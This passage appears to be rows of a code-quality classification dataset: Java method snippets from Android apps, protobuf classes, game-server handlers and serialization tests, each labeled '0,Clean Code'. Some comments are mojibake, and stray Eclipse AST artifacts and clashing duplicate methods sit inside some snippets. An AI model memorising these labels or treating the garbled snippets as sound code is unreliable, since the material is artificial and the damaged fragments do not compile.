  int month=0;
  int day=0;
  int hour=0;
  int minute=0;
  int second=0;
  if (cycleUnit.equalsIgnoreCase(""Y"")) {
    year=1;
  }
 else   if (cycleUnit.equals(""M"")) {
    month=1;
  }
 else   if (cycleUnit.equalsIgnoreCase(""D"")) {
    day=1;
  }
 else   if (cycleUnit.equalsIgnoreCase(""h"")) {
    hour=1;
  }
 else   if (cycleUnit.equals(""10m"")) {
    minute=10;
  }
 else   if (cycleUnit.equals(""15m"")) {
    minute=15;
  }
 else   if (cycleUnit.equals(""30m"")) {
    minute=30;
  }
 else   if (cycleUnit.equalsIgnoreCase(""s"")) {
    second=1;
  }
 else {
    logger.error(""cycleUnit {} is error: "",cycleUnit);
    return ret;
  }
  while (dtStart.lteq(dtEnd)) {
    ret.add(dtStart.getMilliseconds(TimeZone.getDefault()));
    dtStart=dtStart.plus(year,month,day,hour,minute,second,0,DateTime.DayOverflow.LastDay);
  }
  return ret;
}",0,Clean Code
"/** 
 * @return Considering C-style comments to be whitespace, return the index of the next non-whitespace character.
 */
public static int indexOfNextNonWhitespace(int cursor,String source){
  boolean inMultiLineComment=false;
  boolean inSingleLineComment=false;
  int length=source.length();
  for (; cursor < length; cursor++) {
    char current=source.charAt(cursor);
    if (inSingleLineComment) {
      inSingleLineComment=current != '\n';
      continue;
    }
 else     if (length > cursor + 1) {
      char next=source.charAt(cursor + 1);
      if (current == '/' && next == '/') {
        inSingleLineComment=true;
        cursor++;
        continue;
      }
 else       if (current == '/' && next == '*') {
        inMultiLineComment=true;
        cursor++;
        continue;
      }
 else       if (current == '*' && next == '/') {
        inMultiLineComment=false;
        cursor++;
        continue;
      }
    }
    if (!inMultiLineComment && !Character.isWhitespace(current)) {
      break;
    }
  }
  return cursor;
}",0,Clean Code
"/** 
 * Creates a  {@link SubtitleDecoder} for the given {@link Format}.
 * @param format The {@link Format}.
 * @return A new {@link SubtitleDecoder}.
 * @throws IllegalArgumentException If the {@link Format} is not supported.
 */
SubtitleDecoder createDecoder(Format format);
!org.eclipse.jdt.core.dom.MethodDeclaration@511a7d7f",0,Clean Code
"void setFocusOnGuild(boolean z);
",0,Clean Code
"public FileAssistantSearchParams(){
  this.resultSortType=Order.values()[0];
}
public FileAssistantSearchParams(Order order,int i2){
  this.resultSortType=Order.values()[0];
  this.resultSortType=order;
  this.pageLimit=i2;
}",0,Clean Code
"@Override public SetSignatureCsReq copyFrom(final SetSignatureCsReq other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    signature.copyFrom(other.signature);
  }
  return this;
}",0,Clean Code
"private static RawCombinedFlowGraph<RawCombinedBasicBlock,RawCombinedJump<RawCombinedBasicBlock>> buildPrimaryUnmatchedCombinedFlowGraph(final RawFlowGraph primaryFlowGraph){
  final IAddress priFunctionAddr=primaryFlowGraph.getAddress();
  final List<RawCombinedBasicBlock> combinedBasicBlocks=new ArrayList<>();
  final List<RawCombinedJump<RawCombinedBasicBlock>> combinedJumps=new ArrayList<>();
  final Map<IAddress,RawCombinedBasicBlock> helperMap=new HashMap<>();
  for (  final RawBasicBlock primaryBasicBlock : primaryFlowGraph) {
    final RawCombinedBasicBlock combinedBasicBlock=new RawCombinedBasicBlock(primaryBasicBlock,null,null,priFunctionAddr,null);
    helperMap.put(primaryBasicBlock.getAddress(),combinedBasicBlock);
    combinedBasicBlocks.add(combinedBasicBlock);
  }
  for (  final RawJump primaryJump : primaryFlowGraph.getEdges()) {
    final RawCombinedBasicBlock srcCombinedBasicblock=helperMap.get(primaryJump.getSource().getAddress());
    final RawCombinedBasicBlock tarCombinedBasicblock=helperMap.get(primaryJump.getTarget().getAddress());
    final RawCombinedJump<RawCombinedBasicBlock> combinedJump;
    combinedJump=new RawCombinedJump<>(srcCombinedBasicblock,tarCombinedBasicblock,primaryJump,null);
    combinedJumps.add(combinedJump);
  }
  return new RawCombinedFlowGraph<>(combinedBasicBlocks,combinedJumps,primaryFlowGraph,null);
}
",0,Clean Code
"private FeatureDomainProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private FeatureDomainProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@57f3077",0,Clean Code
"public boolean validate(TestResourceDTO testResourceDTO){
  List<TestResourceNodeDTO> nodesList=testResourceDTO.getNodesList();
  if (CollectionUtils.isEmpty(nodesList)) {
    throw new MSException(Translator.get(""no_nodes_message""));
  }
  boolean isValid=true;
  for (  TestResourceNodeDTO testResourceNodeDTO : nodesList) {
    if (StringUtils.isBlank(testResourceNodeDTO.getIp())) {
      throw new MSException(Translator.get(""ip_is_null""));
    }
    if (StringUtils.isBlank(testResourceNodeDTO.getPort())) {
      throw new MSException(Translator.get(""port_is_null""));
    }
    if (testResourceNodeDTO.getConcurrentNumber() == null) {
      throw new MSException(Translator.get(""concurrent_number_is_null""));
    }
    if (!licenseValidate()) {
      if (testResourceNodeDTO.getConcurrentNumber() > 10) {
        testResourceNodeDTO.setConcurrentNumber(10);
      }
    }
    isValid=validateNode(testResourceNodeDTO);
    if (!isValid) {
      break;
    }
  }
  List<ImmutablePair<String,String>> ipPort=nodesList.stream().map(resource -> {
    return new ImmutablePair<>(resource.getIp(),resource.getPort());
  }
).distinct().toList();
  if (ipPort.size() < nodesList.size()) {
    throw new MSException(Translator.get(""duplicate_node_ip_port""));
  }
  return isValid;
}",0,Clean Code
"/** 
 * 澶囦唤璁板綍
 */
@GetMapping(""/list"") public R<List<BackupFile>> list(){
  return R.ok(backupService.listAll(AuthContext.getUserId()).stream().sorted((b1,b2) -> SortUtil.dateSort.compare(b1.getDatetime(),b2.getDatetime())).collect(Collectors.toList()));
}",0,Clean Code
"/** 
 * Add a new sort
 * @param orderBy sort
 * @return Sorting parameters
 */
public QueryParam andOrderBy(OrderBy orderBy){
  orderByList.add(orderBy);
  return this;
}
/** 
 * Add a new sort
 * @param orderConditionName sort field
 * @param direction          Sorting direction
 * @return Sorting parameters
 */
public QueryParam andOrderBy(String orderConditionName,OrderByDirectionEnum direction){
  return andOrderBy(new OrderBy(orderConditionName,direction));
}
/** 
 * Add a new sort
 * @param orderCondition Sorting conditions
 * @return Sorting parameters
 */
public QueryParam andOrderBy(OrderCondition orderCondition){
  return andOrderBy(orderCondition.getOrderBy());
}
",0,Clean Code
"public static int minDepth2(TreeNode head){
  if (head == null) {
    return 0;
  }
  TreeNode cur=head;
  TreeNode mostRight=null;
  int curLevel=0;
  int minHeight=Integer.MAX_VALUE;
  while (cur != null) {
    mostRight=cur.left;
    if (mostRight != null) {
      int rightBoardSize=1;
      while (mostRight.right != null && mostRight.right != cur) {
        rightBoardSize++;
        mostRight=mostRight.right;
      }
      if (mostRight.right == null) {
        curLevel++;
        mostRight.right=cur;
        cur=cur.left;
        continue;
      }
 else {
        if (mostRight.left == null) {
          minHeight=Math.min(minHeight,curLevel);
        }
        curLevel-=rightBoardSize;
        mostRight.right=null;
      }
    }
 else {
      curLevel++;
    }
    cur=cur.right;
  }
  int finalRight=1;
  cur=head;
  while (cur.right != null) {
    finalRight++;
    cur=cur.right;
  }
  if (cur.left == null && cur.right == null) {
    minHeight=Math.min(minHeight,finalRight);
  }
  return minHeight;
}",0,Clean Code
"private void addCrmExamineNotice(AdminMessageEnum messageEnum,String title,Long typeId,Long userId,List<Long> ids){
  AdminMessage adminMessage=new AdminMessage();
  adminMessage.setCreateTime(LocalDateTimeUtil.now());
  adminMessage.setCreateUser(userId);
  adminMessage.setType(messageEnum.getType());
  adminMessage.setLabel(messageEnum.getLabel());
  adminMessage.setTitle(title);
  adminMessage.setRecipientUser(ids.get(0));
  adminMessage.setTypeId(typeId);
  adminMessage.setContent(setContent(messageEnum,typeId,null,adminMessage,null));
  save(adminMessage);
}",0,Clean Code
"public GProGetGuildLabelRsp(){
  this.welcomeContent="""";
  this.labelInfos=new ArrayList<>();
}
public GProGetGuildLabelRsp(long j2,long j3,String str,ArrayList<GProLabelInfo> arrayList){
  this.welcomeContent="""";
  this.labelInfos=new ArrayList<>();
  this.maxLabels=j2;
  this.maxAvNums=j3;
  this.welcomeContent=str;
  this.labelInfos=arrayList;
}",0,Clean Code
"public static void initHideMiSmartHubEntry(ClassLoader classLoader){
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_mi_smart_hub_entry"",0) == 1) {
    XposedHelpers.findAndHookMethod(""miui.systemui.controlcenter.panel.main.external.MiSmartHubEntryController"",classLoader,""available"",boolean.class,XC_MethodReplacement.returnConstant(true));
  }
 else   if (mPrefsMap.getStringAsInt(""system_ui_control_center_mi_smart_hub_entry"",0) == 2) {
    XposedHelpers.findAndHookMethod(""miui.systemui.controlcenter.panel.main.external.MiSmartHubEntryController"",classLoader,""available"",boolean.class,XC_MethodReplacement.returnConstant(false));
  }
}",0,Clean Code
"private NodeType getVisibleNode(final NodeType node){
  NodeType previousNode=node;
  IGroupNode<?,?> parentGroup=((IViewNode<?>)node.getRawNode()).getParentGroup();
  while ((parentGroup != null) && parentGroup.isCollapsed()) {
    previousNode=m_graph.getNode(parentGroup);
    parentGroup=parentGroup.getParentGroup();
  }
  return previousNode;
}
",0,Clean Code
"/** 
 * <code>optional string stop_desc = 5;</code>
 * @return internal {@code Utf8String} representation of stopDesc for modifications
 */
public Utf8String getMutableStopDescBytes(){
  bitField0_|=0x00000008;
  return this.stopDesc;
}",0,Clean Code
"@Override public SceneInfo mergeFrom(final SceneInfo other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasGameModeType()) {
    setGameModeType(other.gameModeType);
  }
  if (other.hasLeaderEntityId()) {
    setLeaderEntityId(other.leaderEntityId);
  }
  if (other.hasPlaneId()) {
    setPlaneId(other.planeId);
  }
  if (other.hasClientPosVersion()) {
    setClientPosVersion(other.clientPosVersion);
  }
  if (other.hasFloorId()) {
    setFloorId(other.floorId);
  }
  if (other.hasWorldId()) {
    setWorldId(other.worldId);
  }
  if (other.hasEntryId()) {
    setEntryId(other.entryId);
  }
  if (other.hasGroupIdList()) {
    getMutableGroupIdList().addAll(other.groupIdList);
  }
  if (other.hasLightenSectionList()) {
    getMutableLightenSectionList().addAll(other.lightenSectionList);
  }
  if (other.hasEntityList()) {
    getMutableEntityList().addAll(other.entityList);
  }
  if (other.hasEntityGroupList()) {
    getMutableEntityGroupList().addAll(other.entityGroupList);
  }
  if (other.hasExtraData()) {
    getMutableExtraData().addAll(other.extraData);
  }
  if (other.hasGroupStateList()) {
    getMutableGroupStateList().addAll(other.groupStateList);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@206a4565!org.eclipse.jdt.core.dom.MethodDeclaration@59cf4bd8@Override public ExtraDataEntry mergeFrom(final ExtraDataEntry other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasValue()) {
    setValue(other.value_);
  }
  if (other.hasKey()) {
    getMutableKeyBytes().copyFrom(other.key);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@6233c338!org.eclipse.jdt.core.dom.MethodDeclaration@4f01898f",0,Clean Code
"@Override public void onCreateContextMenu(ContextMenu menu,View v,ContextMenu.ContextMenuInfo menuInfo){
  if (v.getId() == R.id.list_location) {
    menu.setHeaderTitle(String.valueOf(mLocationDataList.get(((AdapterView.AdapterContextMenuInfo)menuInfo).position).getRemarks()));
    getMenuInflater().inflate(R.menu.menu_location,menu);
  }
 else {
    super.onCreateContextMenu(menu,v,menuInfo);
  }
}
",0,Clean Code
"public static ParameterizedType listOf(Type elementType){
  return parameterizedType(List.class,elementType);
}
",0,Clean Code
"/** 
 * Get the finish reason.
 * @return the finish reason, or {@code null}.
 */
public FinishReason finishReason(){
  return finishReason;
}
",0,Clean Code
"private void updateView(){
  setEnabled(users.size() > 0);
  for (int i=0; i < 3; i++) {
    if (i < users.size()) {
      avatarsImageView.setObject(i,currentAccount,users.get(i));
    }
 else {
      avatarsImageView.setObject(i,currentAccount,null);
    }
  }
  if (users.size() == 1) {
    avatarsImageView.setTranslationX(AndroidUtilities.dp(24));
  }
 else   if (users.size() == 2) {
    avatarsImageView.setTranslationX(AndroidUtilities.dp(12));
  }
 else {
    avatarsImageView.setTranslationX(0);
  }
  titleView.setRightPadding(AndroidUtilities.dp(8 + 24 + Math.min(2,users.size() - 1) * 12 + 6));
  avatarsImageView.commitTransition(false);
  if (peerIds.size() == 1 && users.get(0) != null) {
    titleView.setText(ContactsController.formatName(users.get(0).first_name,users.get(0).last_name));
  }
 else {
    if (peerIds.size() == 0) {
      titleView.setText(LocaleController.getString(""NobodyViewed"",R.string.NobodyViewed));
    }
 else {
      titleView.setText(LocaleController.formatPluralString(isVoice ? ""MessagePlayed"" : ""MessageSeen"",peerIds.size()));
    }
  }
  titleView.animate().alpha(1f).setDuration(220).start();
  avatarsImageView.animate().alpha(1f).setDuration(220).start();
  flickerLoadingView.animate().alpha(0f).setDuration(220).setListener(new HideViewAfterAnimation(flickerLoadingView)).start();
  if (listView != null && listView.getAdapter() != null) {
  }
}",0,Clean Code
"@Override public UnlockBackGroundMusicScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  unlockedIds.clear();
  musicList.clear();
  return this;
}",0,Clean Code
"public static TaskResult complete(){
  return newTaskResult(Status.COMPLETED);
}
",0,Clean Code
"@Override public void editableContentChanged(final ZyLabelContent labelContent){
  setCommentsChanged(true);
}
",0,Clean Code
"@Input @Optional public abstract Property<Boolean> getSkipPublishCheck();
",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 7;</code>
 * @return this
 */
public ChessRogueInfo clearLineup(){
  bitField0_&=~0x00000002;
  lineup.clear();
  return this;
}",0,Clean Code
"public LiteralValue(Object value){
  super(value.getClass());
  this.value=value.toString();
}
public LiteralValue(Class<?> javaType,String value){
  super(javaType);
  this.value=value;
}
",0,Clean Code
"@Override public GetQuestDataScRsp copyFrom(final GetQuestDataScRsp other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    totalAchievementExp=other.totalAchievementExp;
    retcode=other.retcode;
    questList.copyFrom(other.questList);
  }
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 slot = 13;</code>
 * @param value the slot to set
 * @return this
 */
public LineupAvatar setSlot(final int value){
  bitField0_|=0x00000008;
  slot=value;
  return this;
}",0,Clean Code
"@EventHandler private void onMouseButton(MouseButtonEvent event){
  if (checkGuiMove())   return;
  boolean cancel=true;
  if (mc.options.forwardKey.matchesMouse(event.button)) {
    forward=event.action != KeyAction.Release;
    mc.options.forwardKey.setPressed(false);
  }
 else   if (mc.options.backKey.matchesMouse(event.button)) {
    backward=event.action != KeyAction.Release;
    mc.options.backKey.setPressed(false);
  }
 else   if (mc.options.rightKey.matchesMouse(event.button)) {
    right=event.action != KeyAction.Release;
    mc.options.rightKey.setPressed(false);
  }
 else   if (mc.options.leftKey.matchesMouse(event.button)) {
    left=event.action != KeyAction.Release;
    mc.options.leftKey.setPressed(false);
  }
 else   if (mc.options.jumpKey.matchesMouse(event.button)) {
    up=event.action != KeyAction.Release;
    mc.options.jumpKey.setPressed(false);
  }
 else   if (mc.options.sneakKey.matchesMouse(event.button)) {
    down=event.action != KeyAction.Release;
    mc.options.sneakKey.setPressed(false);
  }
 else {
    cancel=false;
  }
  if (cancel)   event.cancel();
}
",0,Clean Code
"public static RecallAnimalType recallAnimalType(){
  return getConfig().recallAnimalType;
}
",0,Clean Code
"/** 
 * <pre> true </pre> <code>optional bool is_unlocked = 8;</code>
 * @return the isUnlocked
 */
public boolean getIsUnlocked(){
  return isUnlocked;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.math.protos.DistanceProto)) {
    return super.equals(obj);
  }
  org.tribuo.math.protos.DistanceProto other=(org.tribuo.math.protos.DistanceProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"void getUid(HashSet<Long> hashSet,IKernelGetUidInfoCallback iKernelGetUidInfoCallback);
",0,Clean Code
"private VariableInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private VariableInfoProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1b4cc985",0,Clean Code
"/** 
 * <code>optional uint32 tid = 8;</code>
 * @return whether the tid field is set
 */
public boolean hasTid(){
  return (bitField0_ & 0x00000008) != 0;
}",0,Clean Code
"@Override public SceneEntityTeleportScRsp clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  entityMotion.clearQuick();
  return this;
}",0,Clean Code
"@Override public Icon getIcon(){
  RawFunction function=(RawFunction)combinedDiffNode.getPrimaryRawNode();
  if (function == null) {
    function=(RawFunction)combinedDiffNode.getPrimaryRawNode();
  }
switch (combinedDiffNode.getRawNode().getMatchState()) {
case MATCHED:
{
      if (function.isIdenticalMatch()) {
        if (isSelected()) {
          return MATCHED_IDENTICAL_FUNCTION_SELECTED_ICON;
        }
 else         if (!isVisible()) {
          return MATCHED_IDENTICAL_FUNCTION_INVISIBLE_ICON;
        }
        return MATCHED_IDENTICAL_FUNCTION_ICON;
      }
 else       if (function.isChangedInstructionsOnlyMatch()) {
        if (isSelected()) {
          return MATCHED_INSTRUCTIONCHANGED_FUNCTION_SELECTED_ICON;
        }
 else         if (!isVisible()) {
          return MATCHED_INSTRUCTIONCHANGED_FUNCTION_INVISIBLE_ICON;
        }
        return MATCHED_INSTRUCTIONCHANGED_FUNCTION_ICON;
      }
 else       if (function.isChangedStructuralMatch()) {
        if (isSelected()) {
          return MATCHED_STRUCTURALCHANGED_FUNCTION_SELECTED_ICON;
        }
 else         if (!isVisible()) {
          return MATCHED_STRUCTURALCHANGED_FUNCTION_INVISIBLE_ICON;
        }
        return MATCHED_STRUCTURALCHANGED_FUNCTION_ICON;
      }
      break;
    }
case PRIMARY_UNMATCHED:
{
    if (combinedDiffNode != null) {
      if (combinedDiffNode.isSelected()) {
        return PRIMARY_UNMATCHED_FUNCTION_SELECTED;
      }
 else       if (!combinedDiffNode.isVisible()) {
        return PRIMARY_UNMATCHED_FUNCTION_INVISIBLE;
      }
    }
    return PRIMARY_UNMATCHED_FUNCTION;
  }
case SECONDRAY_UNMATCHED:
{
  if (combinedDiffNode != null) {
    if (combinedDiffNode.isSelected()) {
      return SECONDARY_UNMATCHED_FUNCTION_SELECTED;
    }
 else     if (!combinedDiffNode.isVisible()) {
      return SECONDARY_UNMATCHED_FUNCTION_INVISIBLE;
    }
  }
  return SECONDARY_UNMATCHED_FUNCTION;
}
}
throw new IllegalStateException(""Unknown match type."");
}
",0,Clean Code
"public static <NodeType extends ZyGraphNode<?>>List<NodeType> getVisibleNodes(final AbstractZyGraph<NodeType,?> graph){
  final ArrayList<NodeType> nodes=new ArrayList<NodeType>();
  IteratorFunctions.iterateVisible(graph,new INodeCallback<NodeType>(){
    @Override public IterationMode next(    final NodeType node){
      nodes.add(node);
      return IterationMode.CONTINUE;
    }
  }
);
  return nodes;
}
",0,Clean Code
"private static List<Pair<Integer,ESide>> getColumnIndices(final ESide side){
  final List<Pair<Integer,ESide>> indices=new ArrayList<>();
  indices.add(new Pair<>(UnmatchedFunctionViewsTableModel.ADDRESS,side));
  indices.add(new Pair<>(UnmatchedFunctionViewsTableModel.FUNCTION_NAME,side));
  indices.add(new Pair<>(UnmatchedFunctionViewsTableModel.TYPE,side));
  return indices;
}
",0,Clean Code
"@Override public View getChildAt(int index){
  int position=index;
  final int childCount=getChildCount();
  if (mDraggedView != null) {
    int dragIndex=mDraggedPosition - mFirstVisibleFirstItem;
    if (dragIndex == 0) {
      if (index == 0) {
        position=1;
      }
 else       if (position == 1) {
        position=0;
      }
 else {
      }
    }
 else     if (dragIndex == childCount - 1) {
      if (childCount % mColumnsNum != 1) {
        if (index == childCount - 1) {
          position=index - 1;
        }
 else         if (index == childCount - 2) {
          position=childCount - 1;
        }
      }
    }
  }
  if (position >= getChildCount()) {
    position=getChildCount() - 1;
  }
  return super.getChildAt(position);
}",0,Clean Code
"@Override public CopyOnWriteArrayList onCollectionRead(Collection collection){
  Object[] elements=((CollectionContainer)collection).elements;
  return new CopyOnWriteArrayList(elements);
}
@Override public T onCollectionRead(Collection collection){
  throw new IllegalStateException();
}
@Override public T onCollectionRead(Collection collection){
  throw new IllegalStateException();
}
",0,Clean Code
"@Test(dataProvider=""languageConfig"") public void testSerializationToBuffer(Language language){
  Fury fury1=Fury.builder().withLanguage(language).requireClassRegistration(false).build();
  Fury fury2=Fury.builder().withLanguage(language).requireClassRegistration(false).build();
  MemoryBuffer buffer=MemoryUtils.buffer(64);
  assertSerializationToBuffer(fury1,fury2,buffer);
}",0,Clean Code
"@PostMapping(""/queryAttendanceWifiPageList"") @ApiOperation(""鏌ヨ鎵撳崱Wifi鍒楄〃"") public Result<BasePage<AttendanceWifiPageListVO>> queryAttendanceWifiPageList(@RequestBody PageEntity pageEntity){
  BasePage<AttendanceWifiPageListVO> page=attendanceWifiService.queryAttendanceWifiPageList(pageEntity);
  return Result.ok(page);
}
",0,Clean Code
"@Override public ErrMsg createFromParcel(Parcel parcel){
  return new ErrMsg(parcel);
}
",0,Clean Code
"@Override public GetArchiveDataScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  archiveData.clear();
  return this;
}",0,Clean Code
"/** 
 * Restore a single backup for a given package belonging to the given package
 * @param backupNames Backup names is a singleton array consisting of the full name of a backup.Full name means backup name along with the user handle, ie., for user 0, the full name of base backup is  {@code 0} and the full name of anotherbackup  {@code foo} is {@code 0_foo}.
 */
public void restore(@Nullable String[] backupNames,@Nullable ProgressHandler progressHandler) throws BackupException {
  if (mRequestedFlags.isEmpty()) {
    throw new BackupException(""Restore is requested without any flags."");
  }
  if (mTargetPackage.getPackageName().equals(""android"")) {
    throw new BackupException(""Android System (android) cannot be restored."");
  }
  if (backupNames != null && backupNames.length != 1) {
    throw new BackupException(""Restore is requested from more than one backups!"");
  }
  int backupUserId=-1;
  if (backupNames != null) {
    String backupName=BackupUtils.getShortBackupName(backupNames[0]);
    backupUserId=BackupUtils.getUserHandleFromBackupName(backupNames[0]);
    if (backupName != null) {
      backupNames=new String[]{backupName};
    }
 else {
      backupNames=null;
    }
  }
  if (backupUserId == -1)   backupUserId=mTargetPackage.getUserId();
  BackupFiles backupFiles;
  BackupFiles.BackupFile[] backupFileList;
  try {
    backupFiles=new BackupFiles(mTargetPackage.getPackageName(),backupUserId,backupNames);
    backupFileList=backupFiles.getBackupPaths(false);
  }
 catch (  IOException e) {
    throw new BackupException(""Could not get backup files."",e);
  }
  if (backupFileList.length > 0) {
    if (backupFileList.length > 1) {
      Log.w(RestoreOp.TAG,""More than one backups found! Restoring only the first backup."");
    }
    if (progressHandler != null) {
      int max=calculateMaxProgress(1);
      progressHandler.setProgressTextInterface(ProgressHandler.PROGRESS_PERCENT);
      progressHandler.postUpdate(max,0f);
    }
    try (RestoreOp restoreOp=new RestoreOp(mTargetPackage.getPackageName(),mMetadataManager,mRequestedFlags,backupFileList[0],mTargetPackage.getUserId())){
      restoreOp.runRestore(progressHandler);
      mRequiresRestart|=restoreOp.requiresRestart();
      BackupUtils.putBackupToDbAndBroadcast(ContextUtils.getContext(),restoreOp.getMetadata());
    }
   }
 else {
    Log.w(RestoreOp.TAG,""No backups found."");
  }
}",0,Clean Code
"private void removeTaskMappings(TaskModel task){
  String taskKey=task.getReferenceTaskName() + """" + task.getRetryCount();
  jedisProxy.hdel(nsKey(SCHEDULED_TASKS,task.getWorkflowInstanceId()),taskKey);
  jedisProxy.srem(nsKey(IN_PROGRESS_TASKS,task.getTaskDefName()),task.getTaskId());
  jedisProxy.srem(nsKey(WORKFLOW_TO_TASKS,task.getWorkflowInstanceId()),task.getTaskId());
  jedisProxy.srem(nsKey(TASKS_IN_PROGRESS_STATUS,task.getTaskDefName()),task.getTaskId());
  jedisProxy.zrem(nsKey(TASK_LIMIT_BUCKET,task.getTaskDefName()),task.getTaskId());
}
",0,Clean Code
"/** 
 * 淇敼 <p>璇ユ帴鍙ｅ彧鑳戒慨鏀规枃绔犵殑鍩烘湰淇℃伅, 姝ｆ枃鍙婄増鏈慨鏀硅浣跨敤  {@link ArticleService#updateContentById(ArticleEntity)}
 */
@EnableIndex(type=IndexMsgTypeEnum.ADD,id=""#req.id"") @Transactional(rollbackFor=Exception.class) public Long update(ArticleEntity req){
  XzException404.throwBy(req.getId() == null,""ID涓嶅緱涓虹┖"");
  baseMapper.updById(req);
  if (StrUtil.isNotBlank(req.getName())) {
    referenceService.updateInnerName(req.getUserId(),req.getId(),req.getName());
  }
  return req.getId();
}",0,Clean Code
"/** 
 * 鏍规嵁鏁板�肩被鍨嬭缃畕@linkplain SqlParamValue}銆�
 * @param cn
 * @param st
 * @param paramIndex
 * @param paramValue
 * @return
 * @throws SQLException
 */
protected Object setParamValueForNumber(Connection cn,PreparedStatement st,int paramIndex,SqlParamValue paramValue) throws SQLException {
  Object value=paramValue.getValue();
  if (value instanceof Byte)   st.setByte(paramIndex,((Byte)value).byteValue());
 else   if (value instanceof Short)   st.setShort(paramIndex,((Short)value).shortValue());
 else   if (value instanceof Integer)   st.setInt(paramIndex,((Integer)value).intValue());
 else   if (value instanceof Long)   st.setLong(paramIndex,((Long)value).longValue());
 else   if (value instanceof Float)   st.setFloat(paramIndex,((Float)value).floatValue());
 else   if (value instanceof Double)   st.setDouble(paramIndex,((Double)value).doubleValue());
 else   if (value instanceof BigInteger)   st.setBigDecimal(paramIndex,new BigDecimal((BigInteger)value));
 else   if (value instanceof BigDecimal)   st.setBigDecimal(paramIndex,(BigDecimal)value);
 else   if (value instanceof AtomicInteger)   st.setInt(paramIndex,((AtomicInteger)value).intValue());
 else   if (value instanceof AtomicLong)   st.setLong(paramIndex,((AtomicLong)value).longValue());
 else   value=setParamValueExt(cn,st,paramIndex,paramValue);
  return value;
}
",0,Clean Code
"public static void main(String[] args){
  Function function=(Function)Proxy.newProxyInstance(fury.getClassLoader(),new Class[]{Function.class},new TestInvocationHandler());
  Function deserializedFunction=(Function)fury.deserialize(fury.serialize(function));
  Preconditions.checkArgument(deserializedFunction.apply(null).equals(1));
  System.out.println(""Proxy tests pass"");
}",0,Clean Code
"@Override protected boolean onScrollingHitEdge(float velocity){
  if (velocity > 0 || takePriorityOverChildViews) {
    View view=scrollableChildSupplier == null ? null : scrollableChildSupplier.get();
    if (view instanceof RecyclerView) {
      return rv.fling(0,(int)velocity);
    }
 else     if (view instanceof ScrollView) {
      if (sv.canScrollVertically((int)velocity)) {
        sv.fling((int)velocity);
        return true;
      }
    }
 else     if (view instanceof CustomScrollView) {
      if (sv.canScrollVertically((int)velocity)) {
        sv.fling((int)velocity);
        return true;
      }
    }
 else     if (view instanceof WebView) {
      if (wv.canScrollVertically((int)velocity)) {
        wv.flingScroll(0,(int)velocity);
        return true;
      }
    }
  }
  return false;
}",0,Clean Code
"/** 
 * <code>optional .SceneNpcMonsterInfo npc_monster = 10;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public SceneNpcMonsterInfoOuterClass.SceneNpcMonsterInfo getMutableNpcMonster(){
  bitField0_|=0x00000040;
  return npcMonster;
}",0,Clean Code
"@SuppressLint(""NotifyDataSetChanged"") private void updateMessageAnimated(MessageObject message,boolean updateReactions){
  if (chatAdapter == null) {
    return;
  }
  getNotificationCenter().doOnIdle(() -> {
    if (fragmentView == null) {
      return;
    }
    MessageObject.GroupedMessages group=groupedMessagesMap.get(message.getGroupId());
    if (group != null) {
      if (chatListItemAnimator != null) {
        chatListItemAnimator.groupWillChanged(group);
      }
      for (int i=0; i < group.messages.size(); i++) {
        group.messages.get(i).forceUpdate=true;
        if (updateReactions) {
          group.messages.get(i).reactionsChanged=true;
        }
      }
      chatAdapter.notifyDataSetChanged(true);
    }
 else {
      MessageObject messageInList=messagesDict[0].get(message.getId());
      int index=messages.indexOf(messageInList);
      if (updateReactions) {
        message.forceUpdate=true;
        message.reactionsChanged=true;
      }
      if (index >= 0) {
        chatAdapter.notifyItemChanged(chatAdapter.messagesStartRow + index);
      }
    }
  }
);
}",0,Clean Code
"@Override public RogueBuffSelect clone(){
  return new RogueBuffSelect().copyFrom(this);
}
",0,Clean Code
"@Override public void initPrefs(){
  Bundle args1=new Bundle();
  mRecommend=new RecommendPreference(getContext());
  getPreferenceScreen().addPreference(mRecommend);
  args1.putString("":settings:fragment_args_key"",""prefs_key_phone_additional_network_settings"");
  mRecommend.addRecommendView(getString(R.string.phone_additional_network_settings),null,PhoneFragment.class,args1,R.string.phone);
}",0,Clean Code
"public void putObject(Object obj,Object value){
  Platform.UNSAFE.putObject(obj,fieldOffset,value);
}
",0,Clean Code
"@Override public void handle(GameSession session,byte[] data) throws Exception {
  var req=SwitchLineupIndexCsReq.parseFrom(data);
  session.getPlayer().getLineupManager().switchLineup(req.getIndex());
  session.send(new PacketSwitchLineupIndexScRsp(session.getPlayer().getCurrentLineup()));
}
",0,Clean Code
"/** 
 * get columnName
 */
public static ColumnSegment columnToSqlSegment(String column){
  return () -> column;
}
",0,Clean Code
"public GuavaMapSerializer(Fury fury,Class<T> cls){
  super(fury,cls,true);
